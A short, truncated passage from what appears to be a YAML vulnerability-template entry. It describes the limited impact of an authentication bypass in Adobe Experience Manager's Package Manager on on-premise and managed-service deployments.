    impact: The impact of the AEM Package Manager authentication bypass vulnerability
      is limited to on-premise or managed service environments where default security

      in AEM on-premise or AEM as a Managed Service to avoid potential authentication
      bypass issues in Adobe Experience Manager Package Manager.
